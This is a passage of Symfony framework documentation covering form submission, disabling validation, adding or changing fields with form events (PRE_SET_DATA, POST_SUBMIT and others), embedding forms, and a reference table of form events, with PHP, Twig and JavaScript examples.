    individual fields by calling :method:`Symfony\\Component\\Form\\FormInterface::submit`
    directly on the field::

        $form->get('firstName')->submit('Fabien');

.. tip::

    When submitting a form via a "PATCH" request, you may want to update only a few
    submitted fields. To achieve this, you may pass an optional second boolean
    argument to ``submit()``. Passing ``false`` will remove any missing fields
    within the form object. Otherwise, the missing fields will be set to ``null``.

.. caution::

    When the second parameter ``$clearMissing`` is ``false``, like with the
    "PATCH" method, the validation will only apply to the submitted fields. If
    you need to validate all the underlying data, add the required fields
    manually so that they are validated::

        // 'email' and 'username' are added manually to force their validation
        $form->submit(array_merge(['email' => null, 'username' => null], $request->getPayload()->all()), false);
How to Disable the Validation of Submitted Data
===============================================

Sometimes it is useful to suppress the validation of a form altogether. For
these cases you can set the ``validation_groups`` option to ``false``::

    use Symfony\Component\OptionsResolver\OptionsResolver;

    public function configureOptions(OptionsResolver $resolver): void
    {
        $resolver->setDefaults([
            'validation_groups' => false,
        ]);
    }

Note that when you do that, the form will still run basic integrity checks,
for example whether an uploaded file was too large or whether non-existing
fields were submitted.

The submission of extra form fields can be controlled with the
:ref:`allow_extra_fields config option <form-option-allow-extra-fields>` and
the maximum upload file size should be handled via your PHP and web server
configuration.
How to Dynamically Modify Forms Using Form Events
=================================================

Oftentimes, a form can't be created statically. In this article, you'll learn
how to customize your form based on three common use-cases:

1) :ref:`Customizing your Form Based on the Underlying Data <form-events-underlying-data>`

   Example: you have a "Product" form and need to modify/add/remove a field
   based on the data on the underlying Product being edited.

2) :ref:`How to Dynamically Generate Forms Based on User Data <form-events-user-data>`

   Example: you create a "Friend Message" form and need to build a drop-down
   that contains only users that are friends with the *current* authenticated
   user.

3) :ref:`Dynamic Generation for Submitted Forms <form-events-submitted-data>`

   Example: on a registration form, you have a "country" field and a "state"
   field which should populate dynamically based on the value in the "country"
   field.

If you wish to learn more about the basics behind form events, you can
take a look at the :doc:`Form Events </form/events>` documentation.

.. _form-events-underlying-data:

Customizing your Form Based on the Underlying Data
--------------------------------------------------

Before starting with dynamic form generation, remember what
a bare form class looks like::

    // src/Form/Type/ProductType.php
    namespace App\Form\Type;

    use App\Entity\Product;
    use Symfony\Component\Form\AbstractType;
    use Symfony\Component\Form\FormBuilderInterface;
    use Symfony\Component\OptionsResolver\OptionsResolver;

    class ProductType extends AbstractType
    {
        public function buildForm(FormBuilderInterface $builder, array $options): void
        {
            $builder->add('name');
            $builder->add('price');
        }

        public function configureOptions(OptionsResolver $resolver): void
        {
            $resolver->setDefaults([
                'data_class' => Product::class,
            ]);
        }
    }

.. note::

    If this particular section of code isn't already familiar to you, you
    probably need to take a step back and first review the :doc:`Forms article </forms>`
    before proceeding.

Assume for a moment that this form utilizes an imaginary "Product" class
that has only two properties ("name" and "price"). The form generated from
this class will look the exact same regardless if a new Product is being created
or if an existing product is being edited (e.g. a product fetched from the database).

Suppose now, that you don't want the user to be able to change the ``name`` value
once the object has been created. To do this, you can rely on Symfony's
:doc:`EventDispatcher component </components/event_dispatcher>`
system to analyze the data on the object and modify the form based on the
Product object's data. In this article, you'll learn how to add this level of
flexibility to your forms.

Adding an Event Listener to a Form Class
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

So, instead of directly adding that ``name`` widget, the responsibility of
creating that particular field is delegated to an event listener::

    // src/Form/Type/ProductType.php
    namespace App\Form\Type;

    // ...
    use Symfony\Component\Form\FormEvent;
    use Symfony\Component\Form\FormEvents;

    class ProductType extends AbstractType
    {
        public function buildForm(FormBuilderInterface $builder, array $options): void
        {
            $builder->add('price');

            $builder->addEventListener(FormEvents::PRE_SET_DATA, function (FormEvent $event): void {
                // ... adding the name field if needed
            });
        }

        // ...
    }

The goal is to create a ``name`` field *only* if the underlying ``Product``
object is new (e.g. hasn't been persisted to the database). Based on that,
the event listener might look like the following::

    // ...
    public function buildForm(FormBuilderInterface $builder, array $options): void
    {
        // ...
        $builder->addEventListener(FormEvents::PRE_SET_DATA, function (FormEvent $event): void {
            $product = $event->getData();
            $form = $event->getForm();

            // checks if the Product object is "new"
            // If no data is passed to the form, the data is "null".
            // This should be considered a new "Product"
            if (!$product || null === $product->getId()) {
                $form->add('name', TextType::class);
            }
        });
    }

.. note::

    The ``FormEvents::PRE_SET_DATA`` line actually resolves to the string
    ``form.pre_set_data``. :class:`Symfony\\Component\\Form\\FormEvents`
    serves an organizational purpose. It is a centralized location in which
    you can find all of the various form events available. You can view the
    full list of form events via the
    :class:`Symfony\\Component\\Form\\FormEvents` class.

Adding an Event Subscriber to a Form Class
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

For better reusability or if there is some heavy logic in your event listener,
you can also move the logic for creating the ``name`` field to an
:ref:`event subscriber <event_dispatcher-using-event-subscribers>`::

    // src/Form/EventListener/AddNameFieldSubscriber.php
    namespace App\Form\EventListener;

    use Symfony\Component\EventDispatcher\EventSubscriberInterface;
    use Symfony\Component\Form\Extension\Core\Type\TextType;
    use Symfony\Component\Form\FormEvent;
    use Symfony\Component\Form\FormEvents;

    class AddNameFieldSubscriber implements EventSubscriberInterface
    {
        public static function getSubscribedEvents(): array
        {
            // Tells the dispatcher that you want to listen on the form.pre_set_data
            // event and that the preSetData method should be called.
            return [FormEvents::PRE_SET_DATA => 'preSetData'];
        }

        public function preSetData(FormEvent $event): void
        {
            $product = $event->getData();
            $form = $event->getForm();

            if (!$product || null === $product->getId()) {
                $form->add('name', TextType::class);
            }
        }
    }

Great! Now use that in your form class::

    // src/Form/Type/ProductType.php
    namespace App\Form\Type;

    // ...
    use App\Form\EventListener\AddNameFieldSubscriber;

    class ProductType extends AbstractType
    {
        public function buildForm(FormBuilderInterface $builder, array $options): void
        {
            $builder->add('price');

            $builder->addEventSubscriber(new AddNameFieldSubscriber());
        }

        // ...
    }

.. _form-events-user-data:

How to Dynamically Generate Forms Based on User Data
----------------------------------------------------

Sometimes you want a form to be generated dynamically based not only on data
from the form but also on something else - like some data from the current user.
Suppose you have a social website where a user can only message people marked
as friends on the website. In this case, a "choice list" of whom to message
should only contain users that are the current user's friends.

Creating the Form Type
~~~~~~~~~~~~~~~~~~~~~~

Using an event listener, your form might look like this::

    // src/Form/Type/FriendMessageFormType.php
    namespace App\Form\Type;

    use Symfony\Component\Form\AbstractType;
    use Symfony\Component\Form\Extension\Core\Type\TextareaType;
    use Symfony\Component\Form\Extension\Core\Type\TextType;
    use Symfony\Component\Form\FormBuilderInterface;
    use Symfony\Component\Form\FormEvent;
    use Symfony\Component\Form\FormEvents;

    class FriendMessageFormType extends AbstractType
    {
        public function buildForm(FormBuilderInterface $builder, array $options): void
        {
            $builder
                ->add('subject', TextType::class)
                ->add('body', TextareaType::class)
            ;
            $builder->addEventListener(FormEvents::PRE_SET_DATA, function (FormEvent $event): void {
                // ... add a choice list of friends of the current application user
            });
        }
    }

The problem is now to get the current user and create a choice field that
contains only this user's friends. This can be done by injecting the ``Security``
service into the form type so you can get the current user object::

    use Symfony\Bundle\SecurityBundle\Security;
    // ...

    class FriendMessageFormType extends AbstractType
    {
        public function __construct(
            private Security $security,
        ) {
        }

        // ....
    }

Customizing the Form Type
~~~~~~~~~~~~~~~~~~~~~~~~~

Now that you have all the basics in place you can use the features of the
security helper to fill in the listener logic::

    // src/Form/Type/FriendMessageFormType.php
    namespace App\Form\Type;

    use App\Entity\User;
    use Doctrine\ORM\EntityRepository;
    use Symfony\Bridge\Doctrine\Form\Type\EntityType;
    use Symfony\Bundle\SecurityBundle\Security;
    use Symfony\Component\Form\Extension\Core\Type\TextareaType;
    use Symfony\Component\Form\Extension\Core\Type\TextType;
    // ...

    class FriendMessageFormType extends AbstractType
    {
        public function __construct(
            private Security $security,
        ) {
        }

        public function buildForm(FormBuilderInterface $builder, array $options): void
        {
            $builder
                ->add('subject', TextType::class)
                ->add('body', TextareaType::class)
            ;

            // grab the user, do a quick sanity check that one exists
            $user = $this->security->getUser();
            if (!$user) {
                throw new \LogicException(
                    'The FriendMessageFormType cannot be used without an authenticated user!'
                );
            }

            $builder->addEventListener(FormEvents::PRE_SET_DATA, function (FormEvent $event) use ($user): void {
                if (null !== $event->getData()->getFriend()) {
                    // we don't need to add the friend field because
                    // the message will be addressed to a fixed friend
                    return;
                }

                $form = $event->getForm();

                $formOptions = [
                    'class' => User::class,
                    'choice_label' => 'fullName',
                    'query_builder' => function (UserRepository $userRepository) use ($user): void {
                        // call a method on your repository that returns the query builder
                        // return $userRepository->createFriendsQueryBuilder($user);
                    },
                ];

                // create the field, this is similar the $builder->add()
                // field name, field type, field options
                $form->add('friend', EntityType::class, $formOptions);
            });
        }

        // ...
    }

.. note::

    You might wonder, now that you have access to the ``User`` object, why not
    just use it directly in ``buildForm()`` and omit the event listener? This is
    because doing so in the ``buildForm()`` method would result in the whole
    form type being modified and not just this one form instance. This may not
    usually be a problem, but technically a single form type could be used on a
    single request to create many forms or fields.

Using the Form
~~~~~~~~~~~~~~

If you're using the :ref:`default services.yaml configuration <service-container-services-load-example>`,
your form is ready to be used thanks to :ref:`autowire <services-autowire>` and
:ref:`autoconfigure <services-autoconfigure>`.
Otherwise, :ref:`register the form class as a service <service-container-creating-service>`
and :doc:`tag it </service_container/tags>` with the ``form.type`` tag.

In a controller, create the form like normal::

    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;

    class FriendMessageController extends AbstractController
    {
        public function new(Request $request): Response
        {
            $form = $this->createForm(FriendMessageFormType::class);

            // ...
        }
    }

You can also  embed the form type into another form::

    // inside some other "form type" class
    public function buildForm(FormBuilderInterface $builder, array $options): void
    {
        $builder->add('message', FriendMessageFormType::class);
    }

.. _form-events-submitted-data:

Dynamic Generation for Submitted Forms
--------------------------------------

Another case that can appear is that you want to customize the form specific to
the data that was submitted by the user. For example, imagine you have a registration
form for sports gatherings. Some events will allow you to specify your preferred
position on the field. This would be a ``choice`` field for example. However, the
possible choices will depend on each sport. Football will have attack, defense,
goalkeeper etc... Baseball will have a pitcher but will not have a goalkeeper. You
will need the correct options in order for validation to pass.

The meetup is passed as an entity field to the form. So we can access each
sport like this::

    // src/Form/Type/SportMeetupType.php
    namespace App\Form\Type;

    use App\Entity\Position;
    use App\Entity\Sport;
    use Symfony\Bridge\Doctrine\Form\Type\EntityType;
    use Symfony\Component\Form\AbstractType;
    use Symfony\Component\Form\FormBuilderInterface;
    use Symfony\Component\Form\FormEvent;
    use Symfony\Component\Form\FormEvents;
    // ...

    class SportMeetupType extends AbstractType
    {
        public function buildForm(FormBuilderInterface $builder, array $options): void
        {
            $builder
                ->add('sport', EntityType::class, [
                    'class' => Sport::class,
                    'placeholder' => '',
                ])
            ;

            $builder->addEventListener(
                FormEvents::PRE_SET_DATA,
                function (FormEvent $event): void {
                    $form = $event->getForm();

                    // this would be your entity, i.e. SportMeetup
                    $data = $event->getData();

                    $sport = $data->getSport();
                    $positions = null === $sport ? [] : $sport->getAvailablePositions();

                    $form->add('position', EntityType::class, [
                        'class' => Position::class,
                        'placeholder' => '',
                        'choices' => $positions,
                    ]);
                }
            );
        }

        // ...
    }

When you're building this form to display to the user for the first time,
then this example works perfectly.

However, things get more difficult when you handle the form submission. This
is because the ``PRE_SET_DATA`` event tells us the data that you're starting
with (e.g. an empty ``SportMeetup`` object), *not* the submitted data.

On a form, we can usually listen to the following events:

* ``PRE_SET_DATA``
* ``POST_SET_DATA``
* ``PRE_SUBMIT``
* ``SUBMIT``
* ``POST_SUBMIT``

The key is to add a ``POST_SUBMIT`` listener to the field that your new field
depends on. If you add a ``POST_SUBMIT`` listener to a form child (e.g. ``sport``),
and add new children to the parent form, the Form component will detect the
new field automatically and map it to the submitted client data.

The type would now look like::

    // src/Form/Type/SportMeetupType.php
    namespace App\Form\Type;

    use App\Entity\Position;
    use App\Entity\Sport;
    use Symfony\Bridge\Doctrine\Form\Type\EntityType;
    use Symfony\Component\Form\FormInterface;
    // ...

    class SportMeetupType extends AbstractType
    {
        public function buildForm(FormBuilderInterface $builder, array $options): void
        {
            $builder
                ->add('sport', EntityType::class, [
                    'class' => Sport::class,
                    'placeholder' => '',
                ])
            ;

            $formModifier = function (FormInterface $form, ?Sport $sport = null): void {
                $positions = null === $sport ? [] : $sport->getAvailablePositions();

                $form->add('position', EntityType::class, [
                    'class' => Position::class,
                    'placeholder' => '',
                    'choices' => $positions,
                ]);
            };

            $builder->addEventListener(
                FormEvents::PRE_SET_DATA,
                function (FormEvent $event) use ($formModifier): void {
                    // this would be your entity, i.e. SportMeetup
                    $data = $event->getData();

                    $formModifier($event->getForm(), $data->getSport());
                }
            );

            $builder->get('sport')->addEventListener(
                FormEvents::POST_SUBMIT,
                function (FormEvent $event) use ($formModifier): void {
                    // It's important here to fetch $event->getForm()->getData(), as
                    // $event->getData() will get you the client data (that is, the ID)
                    $sport = $event->getForm()->getData();

                    // since we've added the listener to the child, we'll have to pass on
                    // the parent to the callback function!
                    $formModifier($event->getForm()->getParent(), $sport);
                }
            );

            // by default, action does not appear in the <form> tag
            // you can set this value by passing the controller route
            $builder->setAction($options['action']);
        }

        // ...
    }

You can see that you need to listen on these two events and have different
callbacks only because in two different scenarios, the data that you can use is
available in different events. Other than that, the listeners always perform
exactly the same things on a given form.

.. tip::

    The ``FormEvents::POST_SUBMIT`` event does not allow modifications to the form
    the listener is bound to, but it allows modifications to its parent.

One piece that is still missing is the client-side updating of your form after
the sport is selected. This should be handled by making an AJAX callback to
your application. Assume that you have a sport meetup creation controller::

    // src/Controller/MeetupController.php
    namespace App\Controller;

    use App\Entity\SportMeetup;
    use App\Form\Type\SportMeetupType;
    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;
    // ...

    class MeetupController extends AbstractController
    {
        #[Route('/create', name: 'app_meetup_create', methods: ['GET', 'POST'])]
        public function create(Request $request): Response
        {
            $meetup = new SportMeetup();
            $form = $this->createForm(SportMeetupType::class, $meetup, ['action' => $this->generateUrl('app_meetup_create')]);
            $form->handleRequest($request);
            if ($form->isSubmitted() && $form->isValid()) {
                // ... save the meetup, redirect etc.
            }

            return $this->render('meetup/create.html.twig', [
                'form' => $form,
            ]);
        }

        // ...
    }

The associated template uses some JavaScript to update the ``position`` form
field according to the current selection in the ``sport`` field:

.. code-block:: html+twig

    {# templates/meetup/create.html.twig #}
    {{ form_start(form, { attr: { id: 'sport_meetup_form' } }) }}
        {{ form_row(form.sport) }}    {# <select id="meetup_sport" ... #}
        {{ form_row(form.position) }} {# <select id="meetup_position" ... #}
        {# ... #}
    {{ form_end(form) }}

    <script>
        const form = document.getElementById('sport_meetup_form');
        const form_select_sport = document.getElementById('meetup_sport');
        const form_select_position = document.getElementById('meetup_position');

        const updateForm = async (data, url, method) => {
          const req = await fetch(url, {
            method: method,
            body: data,
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'charset': 'utf-8'
            }
          });

          const text = await req.text();

          return text;
        };

        const parseTextToHtml = (text) => {
          const parser = new DOMParser();
          const html = parser.parseFromString(text, 'text/html');

          return html;
        };

        const changeOptions = async (e) => {
          const requestBody = e.target.getAttribute('name') + '=' + e.target.value;
          const updateFormResponse = await updateForm(requestBody, form.getAttribute('action'), form.getAttribute('method'));
          const html = parseTextToHtml(updateFormResponse);

          const new_form_select_position = html.getElementById('meetup_position');
          form_select_position.innerHTML = new_form_select_position.innerHTML;
        };

        form_select_sport.addEventListener('change', (e) => changeOptions(e));
    </script>

The major benefit of submitting the whole form to just extract the updated
``position`` field is that no additional server-side code is needed; all the
code from above to generate the submitted form can be reused.
How to Embed Forms
==================

Often, you'll want to build a form that will include fields from many different
objects. For example, a registration form may contain data belonging to
a ``User`` object as well as many ``Address`` objects. Fortunately this can
be achieved by the Form component.

.. _forms-embedding-single-object:

Embedding a Single Object
-------------------------

Suppose that each ``Task`` belongs to a ``Category`` object. Start by
creating the ``Category`` class::

    // src/Entity/Category.php
    namespace App\Entity;

    use Symfony\Component\Validator\Constraints as Assert;

    class Category
    {
        #[Assert\NotBlank]
        public string $name;
    }

Next, add a new ``category`` property to the ``Task`` class::

    // ...

    class Task
    {
        // ...

        #[Assert\Type(type: Category::class)]
        #[Assert\Valid]
        protected ?Category $category = null;

        // ...

        public function getCategory(): ?Category
        {
            return $this->category;
        }

        public function setCategory(?Category $category): void
        {
            $this->category = $category;
        }
    }

.. tip::

    The ``Valid`` Constraint has been added to the property ``category``. This
    cascades the validation to the corresponding entity. If you omit this constraint,
    the child entity would not be validated.

Now that your application has been updated to reflect the new requirements,
create a form class so that a ``Category`` object can be modified by the user::

    // src/Form/CategoryType.php
    namespace App\Form;

    use App\Entity\Category;
    use Symfony\Component\Form\AbstractType;
    use Symfony\Component\Form\FormBuilderInterface;
    use Symfony\Component\OptionsResolver\OptionsResolver;

    class CategoryType extends AbstractType
    {
        public function buildForm(FormBuilderInterface $builder, array $options): void
        {
            $builder->add('name');
        }

        public function configureOptions(OptionsResolver $resolver): void
        {
            $resolver->setDefaults([
                'data_class' => Category::class,
            ]);
        }
    }

The end goal is to allow the ``Category`` of a ``Task`` to be modified right
inside the task form itself. To accomplish this, add a ``category`` field
to the ``TaskType`` object whose type is an instance of the new ``CategoryType``
class::

    use App\Form\CategoryType;
    use Symfony\Component\Form\FormBuilderInterface;

    public function buildForm(FormBuilderInterface $builder, array $options): void
    {
        // ...

        $builder->add('category', CategoryType::class);
    }

The fields from ``CategoryType`` can now be rendered alongside those from
the ``TaskType`` class.

Render the ``Category`` fields in the same way as the original ``Task`` fields:

.. code-block:: html+twig

    {# ... #}

    <h3>Category</h3>
    <div class="category">
        {{ form_row(form.category.name) }}
    </div>

    {# ... #}

When the user submits the form, the submitted data for the ``Category`` fields
are used to construct an instance of ``Category``, which is then set on the
``category`` field of the ``Task`` instance.

The ``Category`` instance is accessible naturally via ``$task->getCategory()``
and can be persisted to the database or used however you need.

Embedding a Collection of Forms
-------------------------------

You can also embed a collection of forms into one form (imagine a ``Category``
form with many ``Product`` sub-forms). This is done by using the ``collection``
field type.

For more information see the :doc:`/form/form_collections` article and the
:doc:`CollectionType </reference/forms/types/collection>` reference.
Form Events
===========

The Form component provides a structured process to let you customize your
forms, by making use of the
:doc:`EventDispatcher component </components/event_dispatcher>`.
Using form events, you may modify information or fields at different steps
of the workflow: from the population of the form to the submission of the
data from the request.

For example, if you need to add a field depending on request values, you can
register an event listener to the ``FormEvents::PRE_SUBMIT`` event as follows::

    // ...

    use Symfony\Component\Form\FormEvent;
    use Symfony\Component\Form\FormEvents;

    $listener = function (FormEvent $event): void {
        // ...
    };

    $form = $formFactory->createBuilder()
        // ... add form fields
        ->addEventListener(FormEvents::PRE_SUBMIT, $listener);

    // ...

The Form Workflow
-----------------

In the lifecycle of a form, there are two moments where the form data can
be updated:

1. During **pre-population** (``setData()``) when building the form;
2. When handling **form submission** (``handleRequest()``) to update the
   form data based on the values the user entered.

.. raw:: html

    <object data="../_images/form/form_workflow.svg" type="image/svg+xml"
        alt="A generic flow diagram showing the two phases. These are
        described in the next subsections."
    ></object>

1) Pre-populating the Form (``FormEvents::PRE_SET_DATA`` and ``FormEvents::POST_SET_DATA``)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

.. raw:: html

    <object data="../_images/form/form_prepopulation_workflow.svg" type="image/svg+xml"
        alt="A flow diagram showing the two events that are dispatched during pre-population."
    ></object>

Two events are dispatched during pre-population of a form, when
:method:`Form::setData() <Symfony\\Component\\Form\\Form::setData>`
is called: ``FormEvents::PRE_SET_DATA`` and ``FormEvents::POST_SET_DATA``.

A) The ``FormEvents::PRE_SET_DATA`` Event
.........................................

The ``FormEvents::PRE_SET_DATA`` event is dispatched at the beginning of the
``Form::setData()`` method. It is used to modify the data given during
pre-population with
:method:`FormEvent::setData() <Symfony\\Component\\Form\\FormEvent::setData>`.
The method :method:`Form::setData() <Symfony\\Component\\Form\\Form::setData>`
is locked since the event is dispatched from it and will throw an exception
if called from a listener.

====================  ======================================
Data Type             Value
====================  ======================================
Event data            Model data injected into ``setData()``
Form model data       ``null``
Form normalized data  ``null``
Form view data        ``null``
====================  ======================================

.. seealso::

    See all form events at a glance in the
    :ref:`Form Events Information Table <component-form-event-table>`.

    instead.

.. sidebar:: ``FormEvents::PRE_SET_DATA`` in the Form component

    The ``Symfony\Component\Form\Extension\Core\Type\CollectionType`` form type relies
    on the ``Symfony\Component\Form\Extension\Core\EventListener\ResizeFormListener``
    subscriber, listening to the ``FormEvents::PRE_SET_DATA`` event in order
    to reorder the form's fields depending on the data from the pre-populated
    object, by removing and adding all form rows.

B) The ``FormEvents::POST_SET_DATA`` Event
..........................................

The ``FormEvents::POST_SET_DATA`` event is dispatched at the end of the
:method:`Form::setData() <Symfony\\Component\\Form\\Form::setData>`
method. This event can be used to modify a form depending on the populated data
(adding or removing fields dynamically).

====================  ====================================================
Data Type             Value
====================  ====================================================
Event data            Model data injected into ``setData()``
Form model data       Model data injected into ``setData()``
Form normalized data  Model data transformed using a model transformer
Form view data        Normalized data transformed using a view transformer
====================  ====================================================

.. seealso::

    See all form events at a glance in the
    :ref:`Form Events Information Table <component-form-event-table>`.

.. sidebar:: ``FormEvents::POST_SET_DATA`` in the Form component

    The ``Symfony\Component\Form\Extension\DataCollector\EventListener\DataCollectorListener``
    class is subscribed to listen to the ``FormEvents::POST_SET_DATA`` event
    in order to collect information about the forms from the denormalized
    model and view data.

2) Submitting a Form (``FormEvents::PRE_SUBMIT``, ``FormEvents::SUBMIT`` and ``FormEvents::POST_SUBMIT``)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

.. raw:: html

    <object data="../_images/form/form_submission_workflow.svg" type="image/svg+xml"
        alt="A flow diagram showing the three events that are dispatched when handling form submissions."
    ></object>

Three events are dispatched when
:method:`Form::handleRequest() <Symfony\\Component\\Form\\Form::handleRequest>`
or :method:`Form::submit() <Symfony\\Component\\Form\\Form::submit>` are
called: ``FormEvents::PRE_SUBMIT``, ``FormEvents::SUBMIT``,
``FormEvents::POST_SUBMIT``.

A) The ``FormEvents::PRE_SUBMIT`` Event
.......................................

The ``FormEvents::PRE_SUBMIT`` event is dispatched at the beginning of the
:method:`Form::submit() <Symfony\\Component\\Form\\Form::submit>` method.

It can be used to:

* Change data from the request, before submitting the data to the form;
* Add or remove form fields, before submitting the data to the form.

====================  ========================================
Data Type             Value
====================  ========================================
Event data            Data from the request
Form model data       Same as in ``FormEvents::POST_SET_DATA``
Form normalized data  Same as in ``FormEvents::POST_SET_DATA``
Form view data        Same as in ``FormEvents::POST_SET_DATA``
====================  ========================================

.. seealso::

    See all form events at a glance in the
    :ref:`Form Events Information Table <component-form-event-table>`.

.. sidebar:: ``FormEvents::PRE_SUBMIT`` in the Form component

    The ``Symfony\Component\Form\Extension\Core\EventListener\TrimListener``
    subscriber subscribes to the ``FormEvents::PRE_SUBMIT`` event in order to
    trim the request's data (for string values).
    The ``Symfony\Component\Form\Extension\Csrf\EventListener\CsrfValidationListener``
    subscriber subscribes to the ``FormEvents::PRE_SUBMIT`` event in order to
    validate the CSRF token.

B) The ``FormEvents::SUBMIT`` Event
...................................

The ``FormEvents::SUBMIT`` event is dispatched right before the
:method:`Form::submit() <Symfony\\Component\\Form\\Form::submit>` method
transforms back the normalized data to the model and view data.

It can be used to change data from the normalized representation of the data.

====================  ===================================================================================
Data Type             Value
====================  ===================================================================================
Event data            Data from the request reverse-transformed from the request using a view transformer
Form model data       Same as in ``FormEvents::POST_SET_DATA``
Form normalized data  Same as in ``FormEvents::POST_SET_DATA``
Form view data        Same as in ``FormEvents::POST_SET_DATA``
====================  ===================================================================================

.. seealso::

    See all form events at a glance in the
    :ref:`Form Events Information Table <component-form-event-table>`.

.. caution::

    At this point, you cannot add or remove fields to the form.

.. sidebar:: ``FormEvents::SUBMIT`` in the Form component

    The ``Symfony\Component\Form\Extension\Core\EventListener\FixUrlProtocolListener``
    subscribes to the ``FormEvents::SUBMIT`` event in order to prepend a default
    protocol to URL fields that were submitted without a protocol.

C) The ``FormEvents::POST_SUBMIT`` Event
........................................

The ``FormEvents::POST_SUBMIT`` event is dispatched after the
:method:`Form::submit() <Symfony\\Component\\Form\\Form::submit>` once the
model and view data have been denormalized.

It can be used to fetch data after denormalization.

====================  ===================================================================================
Data Type             Value
====================  ===================================================================================
Event data            Normalized data transformed using a view transformer
Form model data       Normalized data reverse-transformed using a model transformer
Form normalized data  Data from the request reverse-transformed from the request using a view transformer
Form view data        Normalized data transformed using a view transformer
====================  ===================================================================================

.. seealso::

    See all form events at a glance in the
    :ref:`Form Events Information Table <component-form-event-table>`.

.. caution::

    At this point, you cannot add or remove fields to the current form and its
    children.

.. sidebar:: ``FormEvents::POST_SUBMIT`` in the Form component

    The ``Symfony\Component\Form\Extension\DataCollector\EventListener\DataCollectorListener``
    subscribes to the ``FormEvents::POST_SUBMIT`` event in order to collect
    information about the forms.
    The ``Symfony\Component\Form\Extension\Validator\EventListener\ValidationListener``
    subscribes to the ``FormEvents::POST_SUBMIT`` event in order to
    automatically validate the denormalized object.

Registering Event Listeners or Event Subscribers
------------------------------------------------

In order to be able to use Form events, you need to create an event listener
or an event subscriber and register it to an event.

The name of each of the "form" events is defined as a constant on the
:class:`Symfony\\Component\\Form\\FormEvents` class.
Additionally, each event callback (listener or subscriber method) is passed a
single argument, which is an instance of
:class:`Symfony\\Component\\Form\\FormEvent`. The event object contains a
reference to the current state of the form and the current data being
processed.

.. _component-form-event-table:

======================  =============================  ===============
Name                    ``FormEvents`` Constant        Event's Data
======================  =============================  ===============
``form.pre_set_data``   ``FormEvents::PRE_SET_DATA``   Model data
``form.post_set_data``  ``FormEvents::POST_SET_DATA``  Model data
``form.pre_submit``     ``FormEvents::PRE_SUBMIT``     Request data
``form.submit``         ``FormEvents::SUBMIT``         Normalized data
``form.post_submit``    ``FormEvents::POST_SUBMIT``    View data
======================  =============================  ===============

Event Listeners
~~~~~~~~~~~~~~~

An event listener may be any type of valid callable. For example, you can
define an event listener function inline right in the ``addEventListener``
method of the ``FormFactory``::

    // ...

    use Symfony\Component\Form\Event\PreSubmitEvent;
    use Symfony\Component\Form\Extension\Core\Type\CheckboxType;
    use Symfony\Component\Form\Extension\Core\Type\EmailType;
    use Symfony\Component\Form\Extension\Core\Type\TextType;
    use Symfony\Component\Form\FormEvents;

    $form = $formFactory->createBuilder()
        ->add('username', TextType::class)
        ->add('showEmail', CheckboxType::class)
        ->addEventListener(FormEvents::PRE_SUBMIT, function (PreSubmitEvent $event): void {
            $user = $event->getData();
            $form = $event->getForm();

            if (!$user) {
                return;
            }

            // checks whether the user has chosen to display their email or not.
            // If the data was submitted previously, the additional value that is
            // included in the request variables needs to be removed.
            if (isset($user['showEmail']) && $user['showEmail']) {
                $form->add('email', EmailType::class);
            } else {
                unset($user['email']);
                $event->setData($user);
            }
        })
        ->getForm();

    // ...

When you have created a form type class, you can use one of its methods as a
callback for better readability::

    // src/Form/SubscriptionType.php
    namespace App\Form;

    use Symfony\Component\Form\Event\PreSetDataEvent;
    use Symfony\Component\Form\Extension\Core\Type\CheckboxType;
    use Symfony\Component\Form\Extension\Core\Type\TextType;
    use Symfony\Component\Form\FormEvents;

    // ...
    class SubscriptionType extends AbstractType
    {
        public function buildForm(FormBuilderInterface $builder, array $options): void
        {
            $builder
                ->add('username', TextType::class)
                ->add('showEmail', CheckboxType::class)
                ->addEventListener(
                    FormEvents::PRE_SET_DATA,
                    [$this, 'onPreSetData']
                )
            ;
        }

        public function onPreSetData(PreSetDataEvent $event): void
        {
            // ...
        }
    }

Event Subscribers
~~~~~~~~~~~~~~~~~

Event subscribers have different uses:

* Improving readability;
* Listening to multiple events;
* Regrouping multiple listeners inside a single class.

Consider the following example of a form event subscriber::

    // src/Form/EventListener/AddEmailFieldListener.php
    namespace App\Form\EventListener;

    use Symfony\Component\EventDispatcher\EventSubscriberInterface;
    use Symfony\Component\Form\Event\PreSetDataEvent;
    use Symfony\Component\Form\Event\PreSubmitEvent;
    use Symfony\Component\Form\Extension\Core\Type\EmailType;
    use Symfony\Component\Form\FormEvents;

    class AddEmailFieldListener implements EventSubscriberInterface
    {
        public static function getSubscribedEvents(): array
        {
            return [
                FormEvents::PRE_SET_DATA => 'onPreSetData',
                FormEvents::PRE_SUBMIT   => 'onPreSubmit',
            ];
        }

        public function onPreSetData(PreSetDataEvent $event): void
        {
            $user = $event->getData();
            $form = $event->getForm();

            // checks whether the user from the initial data has chosen to
            // display their email or not.
            if (true === $user->isShowEmail()) {
                $form->add('email', EmailType::class);
            }
        }

        public function onPreSubmit(PreSubmitEvent $event): void
        {
            $user = $event->getData();
            $form = $event->getForm();

            if (!$user) {
                return;
            }

            // checks whether the user has chosen to display their email or not.
            // If the data was submitted previously, the additional value that
            // is included in the request variables needs to be removed.
            if (isset($user['showEmail']) && $user['showEmail']) {
                $form->add('email', EmailType::class);
            } else {
                unset($user['email']);
                $event->setData($user);
            }
        }
    }

To register the event subscriber, use the ``addEventSubscriber()`` method::

    use App\Form\EventListener\AddEmailFieldListener;
    use Symfony\Component\Form\Extension\Core\Type\CheckboxType;
    use Symfony\Component\Form\Extension\Core\Type\TextType;

    // ...

    $form = $formFactory->createBuilder()
        ->add('username', TextType::class)
        ->add('showEmail', CheckboxType::class)
        ->addEventSubscriber(new AddEmailFieldListener())
        ->getForm();

    // ...
How to Embed a Collection of Forms
==================================

